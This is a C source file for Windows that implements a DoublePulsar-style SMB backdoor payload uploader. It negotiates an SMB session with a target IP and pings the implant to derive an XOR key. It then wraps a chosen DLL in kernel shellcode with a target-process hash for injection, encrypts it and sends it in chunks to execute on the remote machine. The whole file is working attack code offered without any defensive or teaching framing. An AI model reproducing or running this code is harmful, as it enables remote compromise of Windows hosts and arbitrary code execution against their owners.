#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include "config.h"

static int upload_send_all(SOCKET sock, const uint8_t *data, size_t length)
{
    size_t sent = 0;

    while (sent < length) {
        size_t remaining = length - sent;
        int amount = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
        int result = send(sock, (const char *)data + sent, amount, 0);
        if (result == SOCKET_ERROR || result == 0) {
            return -1;
        }
        sent += (size_t)result;
    }

    return 0;
}

static int upload_recv_exact(SOCKET sock, uint8_t *data, size_t length)
{
    size_t received = 0;

    while (received < length) {
        size_t remaining = length - received;
        int amount = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
        int result = recv(sock, (char *)data + received, amount, 0);
        if (result == SOCKET_ERROR || result == 0) {
            return -1;
        }
        received += (size_t)result;
    }

    return 0;
}

static int upload_recv_frame(SOCKET sock, uint8_t **frame, size_t *frame_length)
{
    uint8_t header[4];
    size_t body_length;
    uint8_t *buffer;

    *frame = NULL;
    *frame_length = 0;

    if (upload_recv_exact(sock, header, sizeof(header)) != 0) {
        return -1;
    }

    body_length = ((size_t)header[1] << 16) |
                  ((size_t)header[2] << 8) |
                  (size_t)header[3];
    if (body_length > SIZE_MAX - sizeof(header)) {
        return -1;
    }

    buffer = (uint8_t *)malloc(sizeof(header) + body_length);
    if (buffer == NULL) {
        return -1;
    }

    memcpy(buffer, header, sizeof(header));
    if (body_length != 0 &&
        upload_recv_exact(sock, buffer + sizeof(header), body_length) != 0) {
        free(buffer);
        return -1;
    }

    *frame = buffer;
    *frame_length = sizeof(header) + body_length;
    return 0;
}

static void upload_put_le16(uint8_t *buffer, size_t offset, uint16_t value)
{
    buffer[offset] = (uint8_t)value;
    buffer[offset + 1] = (uint8_t)(value >> 8);
}

static void upload_put_le32(uint8_t *buffer, size_t offset, uint32_t value)
{
    buffer[offset] = (uint8_t)value;
    buffer[offset + 1] = (uint8_t)(value >> 8);
    buffer[offset + 2] = (uint8_t)(value >> 16);
    buffer[offset + 3] = (uint8_t)(value >> 24);
}

static void xor_buffer(uint8_t *buffer, size_t length, uint32_t key)
{
    size_t i;

    for (i = 0; i < length; ++i) {
        buffer[i] ^= (uint8_t)(key >> ((i & 3u) * 8u));
    }
}

int upload_payload(const char *ip, int port, const char *payload_path, int payload_type)
{
    WSADATA wsa_data;
    int wsa_started = 0;
    SOCKET sock = INVALID_SOCKET;
    HANDLE file = INVALID_HANDLE_VALUE;
    uint8_t *dll = NULL;
    uint8_t *payload = NULL;
    uint8_t *response = NULL;
    size_t response_length = 0;
    size_t dll_size = 0;
    size_t payload_size = 0;
    LARGE_INTEGER file_size;
    struct sockaddr_in address;
    uint16_t user_id;
    uint16_t tree_id;
    uint32_t sig;
    uint32_t key;
    uint32_t inject_hash = 0;
    const unsigned char *process_name;
    size_t offset;
    int result = -1;

    (void)payload_type;

    if (ip == NULL || payload_path == NULL || port < 1 || port > 65535) {
        return -1;
    }

    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
        return -1;
    }
    wsa_started = 1;

    file = CreateFileA(payload_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                       OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) {
        goto cleanup;
    }
    if (!GetFileSizeEx(file, &file_size) || file_size.QuadPart < 0 ||
        (uint64_t)file_size.QuadPart > (uint64_t)SIZE_MAX) {
        goto cleanup;
    }
    dll_size = (size_t)file_size.QuadPart;
    if (dll_size > UINT32_MAX - 3978u ||
        (size_t)KERNEL_RUNDLL_SIZE > SIZE_MAX - dll_size) {
        goto cleanup;
    }
    payload_size = (size_t)KERNEL_RUNDLL_SIZE + dll_size;
    if (payload_size > UINT32_MAX ||
        KERNEL_RUNDLL_TOTAL_OFFSET > (size_t)KERNEL_RUNDLL_SIZE - 4u ||
        KERNEL_RUNDLL_DLLSIZE_OFFSET > (size_t)KERNEL_RUNDLL_SIZE - 4u ||
        KERNEL_RUNDLL_ORDINAL_OFFSET > (size_t)KERNEL_RUNDLL_SIZE - 4u ||
        KERNEL_RUNDLL_HASH_OFFSET > (size_t)KERNEL_RUNDLL_SIZE - 4u) {
        goto cleanup;
    }

    if (dll_size != 0) {
        dll = (uint8_t *)malloc(dll_size);
        if (dll == NULL) {
            goto cleanup;
        }
    }

    {
        size_t read_total = 0;
        while (read_total < dll_size) {
            DWORD amount = dll_size - read_total > (size_t)DWORD_MAX
                               ? DWORD_MAX
                               : (DWORD)(dll_size - read_total);
            DWORD bytes_read = 0;
            if (!ReadFile(file, dll + read_total, amount, &bytes_read, NULL) ||
                bytes_read == 0) {
                goto cleanup;
            }
            read_total += (size_t)bytes_read;
        }
    }

    CloseHandle(file);
    file = INVALID_HANDLE_VALUE;

    payload = (uint8_t *)malloc(payload_size);
    if (payload == NULL) {
        goto cleanup;
    }
    memcpy(payload, KERNEL_RUNDLL_SHELLCODE, (size_t)KERNEL_RUNDLL_SIZE);
    if (dll_size != 0) {
        memcpy(payload + (size_t)KERNEL_RUNDLL_SIZE, dll, dll_size);
    }

    upload_put_le32(payload, (size_t)KERNEL_RUNDLL_TOTAL_OFFSET,
                    (uint32_t)(dll_size + 3978u));
    upload_put_le32(payload, (size_t)KERNEL_RUNDLL_DLLSIZE_OFFSET,
                    (uint32_t)dll_size);
    upload_put_le32(payload, (size_t)KERNEL_RUNDLL_ORDINAL_OFFSET, 1u);

    process_name = (const unsigned char *)TARGET_INJECT_PROCESS;
    while (*process_name != '\0') {
        inject_hash = inject_hash * 127u + (uint32_t)*process_name++;
    }
    upload_put_le32(payload, (size_t)KERNEL_RUNDLL_HASH_OFFSET, inject_hash);

    memset(&address, 0, sizeof(address));
    address.sin_family = AF_INET;
    address.sin_port = htons((u_short)port);
    if (InetPtonA(AF_INET, ip, &address.sin_addr) != 1) {
        goto cleanup;
    }

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET || connect(sock, (struct sockaddr *)&address,
                                          sizeof(address)) == SOCKET_ERROR) {
        goto cleanup;
    }

    if (upload_send_all(sock, SMB_NEGOTIATE_PKT,
                        sizeof(SMB_NEGOTIATE_PKT) - 1u) != 0 ||
        upload_recv_frame(sock, &response, &response_length) != 0) {
        goto cleanup;
    }
    free(response);
    response = NULL;

    {
        uint8_t request[sizeof(SMB_SESSION_SETUP_PKT) - 1u];
        if (sizeof(request) < 34u) {
            goto cleanup;
        }
        memcpy(request, SMB_SESSION_SETUP_PKT, sizeof(request));
        if (upload_send_all(sock, request, sizeof(request)) != 0 ||
            upload_recv_frame(sock, &response, &response_length) != 0) {
            goto cleanup;
        }
        if (response_length < 34u) {
            goto cleanup;
        }
        user_id = (uint16_t)response[32] | ((uint16_t)response[33] << 8);
        free(response);
        response = NULL;
    }

    {
        uint8_t request[sizeof(SMB_TREE_CONNECT_PKT) - 1u];
        if (sizeof(request) < 34u) {
            goto cleanup;
        }
        memcpy(request, SMB_TREE_CONNECT_PKT, sizeof(request));
        request[32] = (uint8_t)user_id;
        request[33] = (uint8_t)(user_id >> 8);
        if (upload_send_all(sock, request, sizeof(request)) != 0 ||
            upload_recv_frame(sock, &response, &response_length) != 0) {
            goto cleanup;
        }
        if (response_length < 30u) {
            goto cleanup;
        }
        tree_id = (uint16_t)response[28] | ((uint16_t)response[29] << 8);
        free(response);
        response = NULL;
    }

    {
        uint8_t request[sizeof(DP_PING_PKT) - 1u];
        if (sizeof(request) < 34u) {
            goto cleanup;
        }
        memcpy(request, DP_PING_PKT, sizeof(request));
        request[28] = (uint8_t)tree_id;
        request[29] = (uint8_t)(tree_id >> 8);
        request[32] = (uint8_t)user_id;
        request[33] = (uint8_t)(user_id >> 8);
        if (upload_send_all(sock, request, sizeof(request)) != 0 ||
            upload_recv_frame(sock, &response, &response_length) != 0) {
            goto cleanup;
        }
        if (response_length < (size_t)SMB_RESP_SIGNATURE_START + 4u) {
            goto cleanup;
        }
        sig = (uint32_t)response[SMB_RESP_SIGNATURE_START] |
              ((uint32_t)response[SMB_RESP_SIGNATURE_START + 1] << 8) |
              ((uint32_t)response[SMB_RESP_SIGNATURE_START + 2] << 16) |
              ((uint32_t)response[SMB_RESP_SIGNATURE_START + 3] << 24);
        key = (2u * sig) ^
              ((((sig >> 16) | (sig & 0x00FF0000u)) >> 8) |
               (((sig << 16) | (sig & 0x0000FF00u)) << 8));
        free(response);
        response = NULL;
    }

    xor_buffer(payload, payload_size, key);

    for (offset = 0; offset < payload_size; offset += SMB_EXEC_SHELLCODE_LEN) {
        size_t chunk_size = payload_size - offset;
        size_t packet_size;
        uint8_t *packet;
        uint8_t parameters[12];
        uint32_t total_value = (uint32_t)payload_size;
        uint32_t chunk_value;
        uint32_t offset_value = (uint32_t)offset;
        size_t i;

        if (chunk_size > SMB_EXEC_SHELLCODE_LEN) {
            chunk_size = SMB_EXEC_SHELLCODE_LEN;
        }
        chunk_value = (uint32_t)chunk_size;
        packet_size = (size_t)SMB_EXEC_TEMPLATE_LEN + sizeof(parameters) + chunk_size;
        packet = (uint8_t *)malloc(packet_size);
        if (packet == NULL) {
            goto cleanup;
        }

        memcpy(packet, DP_EXEC_PKT, (size_t)SMB_EXEC_TEMPLATE_LEN);
        upload_put_le32(parameters, 0, total_value);
        upload_put_le32(parameters, 4, chunk_value);
        upload_put_le32(parameters, 8, offset_value);
        xor_buffer(parameters, sizeof(parameters), key);
        memcpy(packet + (size_t)SMB_EXEC_TEMPLATE_LEN, parameters, sizeof(parameters));
        memcpy(packet + (size_t)SMB_EXEC_TEMPLATE_LEN + sizeof(parameters),
               payload + offset, chunk_size);

        {
            uint32_t netbios_length =
                (uint32_t)(chunk_size + (size_t)SMB_EXEC_TEMPLATE_LEN +
                           sizeof(parameters) - 4u);
            packet[SMB_NETBIOS_LEN_OFFSET] = (uint8_t)(netbios_length >> 16);
            packet[SMB_NETBIOS_LEN_OFFSET + 1] = (uint8_t)(netbios_length >> 8);
            packet[SMB_NETBIOS_LEN_OFFSET + 2] = (uint8_t)netbios_length;
        }

        upload_put_le16(packet, (size_t)SMB_EXEC_TOTAL_DATA_OFFSET,
                        (uint16_t)chunk_size);
        upload_put_le16(packet, (size_t)SMB_EXEC_DATA_COUNT_OFFSET,
                        (uint16_t)chunk_size);
        upload_put_le16(packet, (size_t)SMB_EXEC_BYTE_COUNT_OFFSET,
                        (uint16_t)(chunk_size + sizeof(parameters)));
        upload_put_le16(packet, (size_t)SMB_TID_OFFSET, tree_id);
        upload_put_le16(packet, (size_t)SMB_UID_OFFSET, user_id);

        if (upload_send_all(sock, packet, packet_size) != 0 ||
            upload_recv_frame(sock, &response, &response_length) != 0) {
            free(packet);
            goto cleanup;
        }
        free(packet);

        if (offset + chunk_size == payload_size) {
            if (response_length <= (size_t)DP_RESP_MUX_ID_OFFSET ||
                response[DP_RESP_MUX_ID_OFFSET] != DP_MULTIPLEX_ID_EXEC) {
                goto cleanup;
            }
        }

        free(response);
        response = NULL;

        for (i = 0; i < 1u; ++i) {
            (void)i;
        }
    }

    result = 0;

cleanup:
    if (response != NULL) {
        free(response);
    }
    if (payload != NULL) {
        free(payload);
    }
    if (dll != NULL) {
        free(dll);
    }
    if (file != INVALID_HANDLE_VALUE) {
        CloseHandle(file);
    }
    if (sock != INVALID_SOCKET) {
        closesocket(sock);
    }
    if (wsa_started) {
        WSACleanup();
    }
    return result;
}